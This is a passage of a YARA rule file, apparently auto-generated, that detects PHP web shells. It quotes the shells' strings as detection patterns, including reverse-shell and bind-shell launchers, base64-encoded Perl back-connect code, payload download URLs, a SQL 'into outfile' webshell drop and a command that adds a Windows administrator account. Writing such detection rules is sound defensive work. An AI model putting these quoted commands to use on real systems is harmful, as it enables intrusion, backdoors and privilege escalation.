      $s7 = "[<a href='$php_self?d=$d&sh311=1'>Shell (1)</a> <a href='$php_self?d=$d&sh311=2'>(2)</a>]" fullword ascii
      $s8 = "passthru(\"nohup perl /tmp/nst_perl_bd.pl &\");" fullword ascii
      $s9 = "passthru(\"nohup /tmp/nst_bc_c $ip &\");" fullword ascii
      $s10 = "<form name=sh311Form method=post><input name=sh3 size=110></form></center><br>\";" fullword ascii
      $s11 = "passthru(\"nohup /tmp/nst_bd &\");" fullword ascii
      $s12 = "<form name=sh311Form method=post><input name=sh3 size=110></form></center><br>" fullword ascii
      $s13 = "<a href='$php_self?d=$d&read_file_safe_mode=1'>Read file if safe mode is On</a> ::\";" fullword ascii
      $s14 = "passthru(\"nohup perl .nst_bd_tmp/nst_perl_bd.pl &\");" fullword ascii
      $s15 = "passthru(\"nohup .nst_bc_c_tmp/nst_bc_c $ip &\");" fullword ascii
      $s16 = "passthru(\"nohup .nst_bd_tmp/nst_bd &\");" fullword ascii
      $s17 = "error_reporting(E_ALL & ~E_NOTICE);" fullword ascii
      $s18 = "document.sh311Form.sh3.value+=\\\" \\\"+ text;" fullword ascii
      $s19 = "if(@$_GET['sh311']==\"2\"){" fullword ascii
      $s20 = "if($_GET['p']==\"ftp\"){" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 200KB and ( 8 of them )
      ) or ( all of them )
}

rule _6417f6b4aa685ba8f0c4a0b836dde05f6aed2a87_a7b3b8a66367f3e61183f78bbb82556eb2c2e40b_220
{
   meta:
      description = "php17 - from files 6417f6b4aa685ba8f0c4a0b836dde05f6aed2a87.php, a7b3b8a66367f3e61183f78bbb82556eb2c2e40b.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "4713738198d1baac37ab2fb1b8906bc8c5e4f4eb064808a051ef89e003ed3f86"
      hash2 = "6100c932ea14b9264bcf16b46893716650bf412b6c4ecd538b37e3205f7a2dcc"
   strings:
      $x1 = "echo Exec_Run('/tmp/yoco_bc '.$_POST['yourip'].' '.$_POST['yourport'].' &') ? 'nc -l -n -v -p '.$_POST['yourport'] : '" fullword ascii
      $x2 = "$cmd = isset($_POST['cmd']) ? $_POST['cmd'] : 'copy c:\\boot.ini d:\\a.txt';" fullword ascii
      $x3 = "echo Exec_Run($perlpath.' /tmp/yoco_bc '.$_POST['yourip'].' '.$_POST['yourport'].' &') ? 'nc -l -n -v -p '.$_POST['yourport'] : " ascii
      $x4 = "echo Exec_Run($perlpath.' /tmp/yoco_bc '.$_POST['yourip'].' '.$_POST['yourport'].' &') ? 'nc -l -n -v -p '.$_POST['yourport'] : " ascii
      $s5 = "$Com_durl = isset($_POST['durl']) ? $_POST['durl'] : 'http://blackbap.org/a.exe';" fullword ascii
      $s6 = "$Com_dpath= isset($_POST['dpath']) ? $_POST['dpath'] : File_Str(dirname(__FILE__).'/a.exe');" fullword ascii
      $s7 = "<input type=\"text\" name=\"tcb\" id=\"tcb\" value=\"http://blackbap.org/muma.exe\" style=\"width:500px;\">';" fullword ascii
      $s8 = ": &lt;script language=javascript src=\"http://blackbap.org/ad.js?EMTDSU\"&gt;&lt;/script&gt;</div></div>" fullword ascii
      $s9 = "$Port_port = isset($_POST['port']) ? $_POST['port'] : '21|22|23|25|80|110|135|139|445|1433|3306|3389|8000|43958';" fullword ascii
      $s10 = "Str[2] = \"select '<?php eval(\\$_POST[cmd]);?>' into outfile 'F://a.php';\";" fullword ascii
      $s11 = "Str[1] = \"select load_file(0x633A5C5C626F6F742E696E69) FROM user into outfile 'D://a.txt'\";" fullword ascii
      $s12 = "633A5C5C626F6F742E696E69" ascii
      $s13 = "Str[3] = \"Driver={MySql};Server=;Port=3306;Database=DB;Uid=root;Pwd=**\";" fullword ascii
      $s14 = "<input name=\"password\" type=\"text\" value=\"silic\" style=\"width:200px\">" fullword ascii
      $s15 = "<input type=\"text\" name=\"qt\" id=\"qt\" value=\".htm|.html|.shtml|.asp|.aspx|.php\" style=\"width:500px;\">" fullword ascii
      $s16 = "<input name=\"password\" type=\"hidden\" value=\"silic\">" fullword ascii
      $s17 = "echo File_Write('/tmp/yoco_bc.c',base64_decode($back_connect_c),'wb') ? '" fullword ascii
      $s18 = "echo File_Write('/tmp/yoco_bc',base64_decode($back_connect_pl),'wb') ? '" fullword ascii
      $s19 = "<input name=\"SUCommand\" type=\"text\" value=\"net user silic silic /add & net localgroup administrators silic /add\" style=\"w" ascii
      $s20 = "<input name=\"SUCommand\" type=\"text\" value=\"net user silic silic /add & net localgroup administrators silic /add\" style=\"w" ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 500KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _13524e06082228ee286d5be519b9d3ef_5aa6b1fb87480c5700151b72e9a72b7a_221
{
   meta:
      description = "php17 - from files 13524e06082228ee286d5be519b9d3ef.php, 5aa6b1fb87480c5700151b72e9a72b7a.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "914d483bcb432cf18c2ffe17923da84a51f170b156500b2329a323fb3fa373db"
      hash2 = "78dd315eb09552f6c67eff132b6a662d99b311be83e728b19eca796cf6af884f"
   strings:
      $x1 = "* @author     Magento Core Team <core@magentocommerce.com>" fullword ascii
      $s2 = "$pageId = Mage::getStoreConfig(Mage_Cms_Helper_Page::XML_PATH_NO_COOKIES_PAGE);" fullword ascii
      $s3 = "* Used if no cookies page don't configure or available" fullword ascii
      $s4 = "* Default index action (with 404 Not Found headers)" fullword ascii
      $s5 = "$pageId = Mage::getStoreConfig(Mage_Cms_Helper_Page::XML_PATH_NO_ROUTE_PAGE);" fullword ascii
      $s6 = "$pageId = Mage::getStoreConfig(Mage_Cms_Helper_Page::XML_PATH_HOME_PAGE);" fullword ascii
      $s7 = "* Used if no route page don't configure or available" fullword ascii
      $s8 = "* Used if default page don't configure or available" fullword ascii
      $s9 = "$this->getResponse()->setHeader('HTTP/1.1','404 Not Found');" fullword ascii
      $s10 = "* Default no cookies page action" fullword ascii
      $s11 = "* Render Disable cookies page" fullword ascii
      $s12 = "$this->_forward('defaultNoCookies');;" fullword ascii
      $s13 = "$this->getResponse()->setHeader('Status','404 File not found');" fullword ascii
      $s14 = "* @param string $coreRoute" fullword ascii
      $s15 = "* Render CMS 404 Not found page" fullword ascii
      $s16 = "* Default no route page action" fullword ascii
      $s17 = "* Renders CMS Home page" fullword ascii
      $s18 = "* Cms index controller" fullword ascii
      $s19 = "$this->_forward('defaultIndex');" fullword ascii
      $s20 = "$this->_forward('defaultNoRoute');" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 10KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _1__4__140748a2a279ced57c797f726dcb7ad9a65005e2_34127df2be5061288e2863da49b977a4a025273f_5425e9f71fca02fd3ac7a3ffa8dbd254afe_222
{
   meta:
      description = "php17 - from files 1 (4).php, 140748a2a279ced57c797f726dcb7ad9a65005e2.php, 34127df2be5061288e2863da49b977a4a025273f.php, 5425e9f71fca02fd3ac7a3ffa8dbd254afec8213.php, 55254f8f1d961c9a832cf2c3f7747b3e510efbdf.php, 5bdae9780fa349f3b58c475985c13c012897bd61.php, 7e594b9fa652d185c4b87ab7080f740f5d7eea2f.php, 9735037eae2f73171d007caca31fbfb6467850d5.php, a7b3b8a66367f3e61183f78bbb82556eb2c2e40b.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "052f0f91060fa3f6723bfe2c0cc469246b58af699cda72e2b57d2918b8d1f1e9"
      hash2 = "c929f266350e6b936ad98409beb09d99a46c174440b2cc294b1b6440b5dea350"
      hash3 = "43411e7e750ebfe589cc4004da7b67e907c6f2cfe868a00962ff6b08b515e4c2"
      hash4 = "0f7aad3e734d2a719d82358afda9ec240e8bd58999d0b76e75f3d5f4dda38985"
      hash5 = "80a13546c401bbf7495b74bfeb0d78d293dd5289b64b3af936cc00372daeacc2"
      hash6 = "af896e0ad20db413c0cc3b5a8cda278400c143b470de54f8ccdf6154592279fd"
      hash7 = "2e605821bf44cdf64b605ee38090f2e3d9807df8d30e8c1c2640a8f5b4471528"
      hash8 = "0a18abae4ed20eb3140925b78cce995a272b596f97191b1fb08024942ee7c854"
      hash9 = "6100c932ea14b9264bcf16b46893716650bf412b6c4ecd538b37e3205f7a2dcc"
   strings:
      $s1 = "<li><a href=\"?s=a\" id=\"t_0\" onclick=\"switchTab('t_0')\" style=\"background:#FFFFFF;\" target=\"main\"> " fullword ascii
      $s2 = "<li><a href=\"?s=c\" id=\"t_2\" onclick=\"switchTab('t_2')\" target=\"main\"> " fullword ascii
      $s3 = "<li><a href=\"?s=j\" id=\"t_9\" onclick=\"switchTab('t_9')\" target=\"main\"> " fullword ascii
      $s4 = "<li><a href=\"?s=h\" id=\"t_7\" onclick=\"switchTab('t_7')\" target=\"main\"> " fullword ascii
      $s5 = "<li><a href=\"?s=f\" id=\"t_5\" onclick=\"switchTab('t_5')\" target=\"main\"> " fullword ascii
      $s6 = "<li><a href=\"?s=e\" id=\"t_4\" onclick=\"switchTab('t_4')\" target=\"main\"> " fullword ascii
      $s7 = "<li><a href=\"?s=b\" id=\"t_1\" onclick=\"switchTab('t_1')\" target=\"main\"> " fullword ascii
      $s8 = "<li><a href=\"?s=d\" id=\"t_3\" onclick=\"switchTab('t_3')\" target=\"main\"> " fullword ascii
      $s9 = "<li><a href=\"?s=i\" id=\"t_8\" onclick=\"switchTab('t_8')\" target=\"main\"> " fullword ascii
      $s10 = "<option value=\"C:/Documents and Settings/All Users/Start Menu/Programs/Startup\"> " fullword ascii
      $s11 = "<form method=\"POST\" action=\"?s=a&p={$THIS_DIR}\" enctype=\"multipart/form-data\">" fullword ascii
      $s12 = ".toptd{background:threedface; width:310px; border-color:#FFFFFF #999999 #999999 #FFFFFF; border-style:solid;border-width:1px;}" fullword ascii
      $s13 = "Str[7] = \"copy c:\\\\\\\\1.php d:\\\\\\\\2.php\";" fullword ascii
      $s14 = "<iframe name=\"main\" src=\"?s=a\" width=\"100%\" height=\"100%\" frameborder=\"0\"></iframe>" fullword ascii
      $s15 = "<form method=\"POST\" name=\"mform\" id=\"mform\" action=\"?s=m\">" fullword ascii
      $s16 = "Str[6] = \"net user guest /active:yes\";" fullword ascii
      $s17 = "Str[10] = \"shutdown -r -t 0\";" fullword ascii
      $s18 = ".listbg {font-family:'lucida grande',tahoma,helvetica,arial,'bitstream vera sans',sans-serif;font-size:13px;width:130px;}" fullword ascii
      $s19 = "Str[9] = \"net start telnet\";" fullword ascii
      $s20 = "Str[4] = \"netstat -an\";" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _060ad92489947d410d897474079c1477_06521d9b70a37cb6455a9684ef3db13944feca2e_25b2ffa40e50b038212591c4eb09a89fe10cbd43_35b0448c_223
{
   meta:
      description = "php17 - from files 060ad92489947d410d897474079c1477.php, 06521d9b70a37cb6455a9684ef3db13944feca2e.php, 25b2ffa40e50b038212591c4eb09a89fe10cbd43.php, 35b0448cd3e328b11521ab053ea0c99694119b82.php, 75aa5981c7740da3a645cd272029090750474ae1.php, 7e4723914113dcea43f5c7fe31576b45ab97bd12.php, 8786355027e9ea8b98725019f1d594fd194cd412.php, 98d13eea07f57d3b4a2c5079cc27659dde6ebfad.php, a2baa41f5667eb2a3ad57003105e57ed0000af38.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "70d1d6937c7b00d4909ff80dcadc7771349d918f99e3515038d550a3d8ac90f2"
      hash2 = "9ebb24b9f38a0cfb5be43a43933fc36aa47140089a5b07560130a88e0c887fed"
      hash3 = "33b0ffc5c6dcf69ccabd978d0c8995f2f4d35d94c5dbbf350f7ded03e6ed82a0"
      hash4 = "b87a5779c3b9ff9e4830be35799a297d9f7dce01d62b6953126f80e969e2a40e"
      hash5 = "007005ffbf899f70fe325993556129086702958b592d4bf22d8465d202a1b11f"
      hash6 = "d37e7daffca28c0d039f1c41e0d960cb912975fa51e391d12eb7330e983cb5de"
      hash7 = "77199ceff72c318f15de256bc93220d21a2bd28d04e6d3d18726c8c272f96eab"
      hash8 = "9ca48c9df4cd95c76600fc0ae6b525c7adc9edfb606ca5fe24aab23d952de256"
      hash9 = "7c07c724d568753b57ae312c6a01c30b0eb9b7117165ef6519d0c125fe751f08"
   strings:
      $x1 = "if($db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base'])) {" fullword ascii
      $x2 = "if( $this->link = @pg_connect(\"host={$host[0]} port={$host[1]} user=$user password=$pass dbname=$dbname\") ) return true;" fullword ascii
      $s3 = "\"process status\" => \"ps aux\"," fullword ascii
      $s4 = "function connect($host, $user, $pass, $dbname){" fullword ascii
      $s5 = "echo '<div><b>Error:</b> '.htmlspecialchars($db->error()).'</div>';" fullword ascii
      $s6 = "cf(\"/tmp/bp.pl\",$bind_port_p);" fullword ascii
      $s7 = "if($_POST['p1'] == 'bpp') {" fullword ascii
      $s8 = "if($_POST['p1'] == 'bcp') {" fullword ascii
      $s9 = "$this->query('SELECT * FROM '.$table);" fullword ascii
      $s10 = "if($_POST['type']=='pgsql')" fullword ascii
      $s11 = "$n = $db->fetch($db->query('SELECT COUNT(*) as n FROM '.$value.''));" fullword ascii
      $s12 = "if(!$host[1]) $host[1]=5432;" fullword ascii
      $s13 = "5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7\";" fullword ascii
      $s14 = "cf(\"/tmp/bc.pl\",$back_connect_p);" fullword ascii
      $s15 = "return $this->res = @pg_query($this->link,$str);" fullword ascii
      $s16 = "'BIN to HEX' => 'binhex'," fullword ascii
      $s17 = "$bind_port_p=\"IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja" ascii
      $s18 = "9MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQ" ascii
      $s19 = "oU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkV" ascii
      $s20 = "psaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCW" ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _01a00e6583ed3789694d600fa831392aa785c5f9_0303e32c8e6674ec89356c9282eeac81606b4fb5_04edbee5e0a3cee384e464d05969bd89b0d32a52__224
{
   meta:
      description = "php17 - from files 01a00e6583ed3789694d600fa831392aa785c5f9.php, 0303e32c8e6674ec89356c9282eeac81606b4fb5.php, 04edbee5e0a3cee384e464d05969bd89b0d32a52.php, 184904fad2bac801b5ffd71da2725ce099c1c077.php, 2009mssql.php, 26aff140c2f73f11d0c78b8823ade092.php, 49c50fe8a010c9849384328b5ca7738065be0a13.php, 528f2ab667dc8492e589a00c579edaaf16f03859.php, 6ba8c54857834508e8be9eecc6c5a25b259fb4cd.php, 82e9a1a1accef35ca21d1e7da20c851659596462.php, 8d87d250b39b4f622107217f9454c057c76b3ae9.php, a647275c30e0a1e78903680ea97931aa8cd39118.php, aa0fc6f621e8b2965b3a109832117d023f4a1ad6.php, arabicspy.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "7e680486104e6dc00dcf1d07faa73d92bb3505caaffcae2941a5624bf82db6f0"
      hash2 = "925fa1651076a0068d090b84fd85dcc6c07793a4c42fce8321920c5cae062ccb"
      hash3 = "5c00d5b172f123e7eb9c0735b60fbaf48b22eec4c7560d9586d891d85e0b3db5"
      hash4 = "93419ee1a9f3416109cebe714b01364db8c45b9ff1d254ef3d8eff21c593b262"
      hash5 = "f3f4f4806fca0d61da9e04cd730529f1424ef405581f424f669222f0b2ad1346"
      hash6 = "1a96d8b149d930cfea410ba3c247efac03bd71e4fec0460f3522950b1fd13a19"
      hash7 = "1d4c1bc5afeca8d7755322dd900886f324e564d2969147bd90754438b63dab5f"
      hash8 = "5aad1a2e4c160a826e6d62b34f0d1ecc9bd9ffc688774fb055f7e0cf50d08e66"
      hash9 = "22079a34d3f2bd293d057babdc4e8474cf6e718f1a11622082cdd93f8801a3f1"
      hash10 = "34fcf9b17604d49903cbb33e49a1ea5983a65333d7fd5d67d3ec3b904aa40df6"
      hash11 = "ae4d2498d852c2c2908709acc93ef11d8eb6f4ed698c606ec7aa2d76385365aa"
      hash12 = "98c1937b9606b1e8e0eebcb116a784c9d2d3db0039b21c45cba399e86c92c2fa"
      hash13 = "2a0cd4aab8539cd4e85ece7e5a8251ae6cc21816a20023f6ddb5d979c98d2cb3"
      hash14 = "9ca895d820411a2b1c4f1f5ca668d10550b897342126ffee1b58f3f1e9d38897"
   strings:
      $s1 = "$tabledump = \"INSERT INTO $table VALUES(\";" fullword ascii
      $s2 = "$tabledump .= \" DEFAULT '$field[Default]'\";" fullword ascii
      $s3 = "$tabledump .= \"CREATE TABLE $table (\\n\";" fullword ascii
      $s4 = "$tabledump .= \" $field[Extra]\";" fullword ascii
      $s5 = "$tabledump .= \"'\".mysql_escape_string($row[$fieldcounter]).\"'\";" fullword ascii
      $s6 = "$tabledump .= \" NOT NULL\";" fullword ascii
      $s7 = "$tabledump .= \"   KEY $kname ($colnames)\";" fullword ascii
      $s8 = "$tabledump .= \"   PRIMARY KEY ($colnames)\";" fullword ascii
      $s9 = "$tabledump .= \");\\n\";" fullword ascii
      $s10 = "$tabledump .= \"\\n);\\n\\n\";" fullword ascii
      $s11 = "$tabledump.=\", \";" fullword ascii
      $s12 = "$tabledump .= \"NULL\";" fullword ascii
      $s13 = "$tabledump .= \",\\n\";" fullword ascii
      $s14 = "$tabledump .= \"   $field[Field] $field[Type]\";" fullword ascii
      $s15 = "while ($key = mysql_fetch_array($keys)) {" fullword ascii
      $s16 = "$index[$kname][] = $key['Column_name'];" fullword ascii
      $s17 = "while(list($kname, $columns) = @each($index)) {" fullword ascii
      $s18 = "while ($field = mysql_fetch_array($fields)) {" fullword ascii
      $s19 = "while ($row = mysql_fetch_array($rows)) {" fullword ascii
      $s20 = "$numfields = mysql_num_fields($rows);" fullword ascii
   condition:
      ( ( uint16(0) == 0x3f3c or uint16(0) == 0xbbef or uint16(0) == 0x683c ) and filesize < 400KB and ( 8 of them )
      ) or ( all of them )
}

rule _031d3c46f8a4462cf23accc3aaecf840f77d9a30_144b414a2168fecf31591bbe049e1424ccff4899_1477fa53e5e56605fe001c88831fcb71e30d6e86__225
{
   meta:
      description = "php17 - from files 031d3c46f8a4462cf23accc3aaecf840f77d9a30.php, 144b414a2168fecf31591bbe049e1424ccff4899.php, 1477fa53e5e56605fe001c88831fcb71e30d6e86.php, 1dc03138e5406f8e1f850181e92084ed0f4b5302.php, 254dad9270910ff036863c6d5d4c555feff98901.php, 35940353c0f3d6511e2789fc3cb9e5b3cea3b10d.php, 5bcb3adc55b62f4e43f154b29d31cced0cbd32a5.php, 649515a5730e7baa0303b29ce49f7e142b88c2ce.php, 691a4634dc5f78ceee68850138b8b68047b8dca6.php, 8d851537dff4dc80cdc23f57784bbf0bd7b4431c.php, 91241fc05105627c2f58942867db10b2b691574e.php, 918af72b83a165b25283dbd8f1490309dfdb77da.php, 942e0fc9984256f2bdb17f8d0c77a7afacb7b112.php, 946a66a5f7f8be95ea7693ee5500bb404b9d0add.php, 95570807b7c1a0531c134fb85c98cdc4ff63ee9b.php, 9f074c6d53409f124b5eeb850502faf587d39a10.php, a79be3a055b701ad9977b5176d0478aa0b0dffd4.php, abdbeae0be991e8bab37946a1b55df5af144a0a8.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "27820c5a30e7d0c36e9e61b5f970de8121e1c493cf22ccdaa3b41f84016f8c5d"
      hash2 = "1fe4c60ea3f32819a98b1725581ac912d0f90d497e63ad81ccf258aeec59fee3"
      hash3 = "124a69cac6fa533abd737127a65ad261a4da66148bf1bdc341e3f733966b5ad6"
      hash4 = "bbbdf28407a4c943f048dcdd7da7515e42797a64b76fd2455e5403b436ec4de8"
      hash5 = "3f92a528a699992e42b86662a50de4d2c52f67e860aa9e7d668f49f512b8237b"
      hash6 = "9ecdb14b41785c779d9721e11bf9e1b7e35611015f4aabf9a1f54a82eaa0725c"
      hash7 = "e46777e5f1ac1652db3ce72dd0a2475ea515b37a737fffd743126772525a47e6"
      hash8 = "756b788401aad4bfd4dbafd15c382d98e3ba079390addb5b0cea7ff7f985f881"
      hash9 = "3c175446e4a5ddb7ddec93c3338097f3ef96b6edb9cc10801be12346d787f3c0"
      hash10 = "f27b491508d18cbfb6f3e57aafcabe5826a2f0098b187ad6459f40b5812c36e0"
      hash11 = "2e5511e45b7c9c6ca7e263ee8d8271214b2b6aae20f2796f4db7b53639f7a699"
      hash12 = "589ad371c414fae2d6f1f0ef7d197cf495bf06d1a0e367f9c3907b77f3054299"
      hash13 = "59105e4623433d5bf93b9e17d72a43a40a4d8ac99e4a703f1d8851ad1276cd88"
      hash14 = "1db0549066f294f814ec14ba4e9f63d88c4460d68477e5895236173df437d2b8"
      hash15 = "97ba3775928dacbf6b4d58416752db2113af88aa914bc35e7b2a7ddf73f70d8b"
      hash16 = "4a30b666f037d28d1b832a95a556d5b15d344fbcfb4756fc1374175e3da9b364"
      hash17 = "b7c6ce332434850db4448f8d2bf26157a6aa4ae1afb43bd5829ee6167b561c85"
      hash18 = "1a2bed0ae0b8846eb567043a998ad835d7e4103abcd6618e4ccb01a2a73a9ec9"
   strings:
      $s1 = "$this->dump[] = '## --------------------------------------- ';" fullword ascii
      $s2 = "$this->dump[1] = '## --------------------------------------- ';" fullword ascii
      $s3 = "$this->dump[5] = '## --------------------------------------- ';" fullword ascii
      $s4 = "$this->dump[0] = '## PostgreSQL dump';" fullword ascii
      $s5 = "$this->connection = @ocilogon($this->user, $this->pass, $this->base);" fullword ascii
      $s6 = "$this->dump[] = $this->rows[0]['Create Table'];" fullword ascii
      $s7 = "$this->dump[0] = '## ORACLE dump';" fullword ascii
      $s8 = "$this->dump[0] = '## MSSQL dump';" fullword ascii
      $s9 = "$this->dump[0] = '## MySQL dump';" fullword ascii
      $s10 = "$this->error = @pg_last_error($this->connection);" fullword ascii
      $s11 = "$this->error = @mysql_error($this->connection);" fullword ascii
      $s12 = "echo \"<br><form name=form method=POST>\";" fullword ascii
      $s13 = "@mssql_close($this->connection);" fullword ascii
      $s14 = "$this->connection = @pg_connect($str);" fullword ascii
      $s15 = "$this->error = 'Query parse error';" fullword ascii
      $s16 = "@oci_close($this->connection);" fullword ascii
      $s17 = "@pg_close($this->connection);" fullword ascii
      $s18 = "$this->error = 'Query error';" fullword ascii
      $s19 = "return @mssql_affected_rows($this->res);" fullword ascii
      $s20 = "$error = @ocierror();" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _398fcc4176cbdefb9271ad67decbab5c08312bf2_67782cfe732cea7fbc4c91e9133b005ad9401377_9f18fc1e8b779eec4d289eea454f05549d387a51_226
{
   meta:
      description = "php17 - from files 398fcc4176cbdefb9271ad67decbab5c08312bf2.php, 67782cfe732cea7fbc4c91e9133b005ad9401377.php, 9f18fc1e8b779eec4d289eea454f05549d387a51.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "2884d456f6a33415db1ce6c8ef4a9a6ed860b3f76482c8460d27bd83120858ab"
      hash2 = "65e7edf10ffb355bed81b7413c77d13d592f63d39e95948cdaea4ea0a376d791"
      hash3 = "d43cdb0daf132269b0a706a1a1b4970450fbaba34492e056305cab320f8c4ba5"
   strings:
      $x1 = "exit(\"<a href=\\\"$sh_mainurl\\\">$sh_name</a>: Access Denied - Your host (\".getenv(\"REMOTE_ADDR\").\") not allowed\");" fullword ascii
      $x2 = "array(\"Md5-Lookup\",\"http://darkc0de.com/database/md5lookup.html\")," fullword ascii
      $s3 = "array(\"Processes\",$surl.\"act=processes&d=%d\")," fullword ascii
      $s4 = "nMessage:\\n\".htmlspecialchars($fdbk_body).\"\\n\\nIP: \".$REMOTE_ADDR;" fullword ascii
      $s5 = "$quicklaunch2[] = array(\"<br>FTP-Brute\",$surl.\"act=ftpquickbrute&d=%d\");" fullword ascii
      $s6 = "\".: Feedback or report bug (\".str_replace(array(\"@\",\".\"),array(\"[at]\",\"[dot]\"),$suppmail).\") :.</td></tr>\"." fullword ascii
      $s7 = "t type=\\\"hidden\\\" name=\\\"fdbk_ref\\\" value=\\\"\".urlencode($HTTP_REFERER).\"\\\"><br>\"." fullword ascii
      $s8 = "\"<tr><td>Message:</td><td><textarea name=\\\"fdbk_body\\\" cols=80 rows=10>\".htmlspecialchars($fdbk_body).\"</textarea><inpu" fullword ascii
      $s9 = "mail($suppmail,$sh_name.\" feedback #\".$ticket,$body,\"FROM: \".$suppmail);" fullword ascii
      $s10 = "$body = $sh_name.\" feedback #\".$ticket.\"\\nName: \".htmlspecialchars($fdbk_name).\"\\nE-mail: \".htmlspecialchars($fdbk_email" ascii
      $s11 = "array(\"Security Info\",$surl.\"act=security&d=%d\")," fullword ascii
      $s12 = "array(\"Encoder\",$surl.\"act=encoder&d=%d\")," fullword ascii
      $s13 = "array(\"Toolz\",$surl.\"act=tools&d=%d\")," fullword ascii
      $s14 = "array(\"MySQL\",$surl.\"act=sql&d=%d\")," fullword ascii
      $s15 = "$hopenbasedir = \"<font color=green>OFF (not secure)</font>\";" fullword ascii
      $s16 = "else { return \"<font color=#00FF00><b>NONE</b></b></font>\"; }" fullword ascii
      $s17 = "\"<input type=hidden name=act value=feedback>\"." fullword ascii
      $s18 = "\"*Language: English, Indonesian.</td></tr>\"." fullword ascii
      $s19 = "array(\"Feedback\",$surl.\"act=feedback\")," fullword ascii
      $s20 = "array(\"About\",$surl.\"act=about\")" fullword ascii
   condition:
      ( ( uint16(0) == 0x3f3c or uint16(0) == 0xbbef ) and filesize < 600KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _069059b7ef840f0c74a814ec9237b6ec_1f1a80153e0fc2ec0b688b66949afb49f1897914_6291c0df3b06048508a5764b9025f68105ccea92_8c5b26f3_227
{
   meta:
      description = "php17 - from files 069059b7ef840f0c74a814ec9237b6ec.php, 1f1a80153e0fc2ec0b688b66949afb49f1897914.php, 6291c0df3b06048508a5764b9025f68105ccea92.php, 8c5b26f383a4b176a12657b913f35d2a639ea054.php, antichat.php, Antichat_Shell._Modified_by_Go0o.php, Antichat_Shell_Modified_by_Go0o.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "cd73e2b32de14c58c3e27d833be05ec7fbfaf569ed10f18d47bf11352d6b4954"
      hash2 = "da39f93031e1ca0bd919e5a062b01d0bf39b52e88919ebae40a1379523ccab37"
      hash3 = "20e6f705f72db86e7171fb1b6df4b9c8f7b49b7d184c58c548617ec3dae86d93"
      hash4 = "f633b6f8fbec621cd8ce60cd786926d3f4a552cc75375ec875ee8e9e4735ba4b"
      hash5 = "6d7af399cf9d9ef4f90454a35ad31bc41884035c8c7a5d12ff924007a698a039"
      hash6 = "4bbf0521ec9f2c1ebcfba9da1f0008df21b7199327ea9b475c3fdd707d918b23"
      hash7 = "cdd96e4dcce2cd8c3156108eec776d5c40879fb01b0ea80dfa190e8f3e51cb05"
   strings:
      $s1 = "global $action,$pass_de,$chars_de,$dat,$date;" fullword ascii
      $s2 = "}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}" fullword ascii
      $s3 = "for ($i26 = 0; $i26 <= $c; $i26++) {" fullword ascii
      $s4 = "for ($i7 = 0; $i7 <= $c; $i7++) {" fullword ascii
      $s5 = "for ($i15 = 0; $i15 <= $c; $i15++) {" fullword ascii
      $s6 = "for ($i10 = 0; $i10 <= $c; $i10++) {" fullword ascii
      $s7 = "for ($i21 = 0; $i21 <= $c; $i21++) {" fullword ascii
      $s8 = "for ($i27 = 0; $i27 <= $c; $i27++) {" fullword ascii
      $s9 = "for ($i9 = 0; $i9 <= $c; $i9++) {" fullword ascii
      $s10 = "for ($i23 = 0; $i23 <= $c; $i23++) {" fullword ascii
      $s11 = "for ($i6 = 0; $i6 <= $c; $i6++) {" fullword ascii
      $s12 = "for ($i8 = 0; $i8 <= $c; $i8++) {" fullword ascii
      $s13 = "for ($i24 = 0; $i24 <= $c; $i24++) {" fullword ascii
      $s14 = "for ($i5 = 0; $i5 <= $c; $i5++) {" fullword ascii
      $s15 = "for ($i3 = 0; $i3 <= $c; $i3++) {" fullword ascii
      $s16 = "for ($i19 = 0; $i19 <= $c; $i19++) {" fullword ascii
      $s17 = "for ($i22 = 0; $i22 <= $c; $i22++) {" fullword ascii
      $s18 = "for ($i12 = 0; $i12 <= $c; $i12++) {" fullword ascii
      $s19 = "for ($i30 = 0; $i30 <= $c; $i30++) {" fullword ascii
      $s20 = "for ($i20 = 0; $i20 <= $c; $i20++) {" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 400KB and ( 8 of them )
      ) or ( all of them )
}

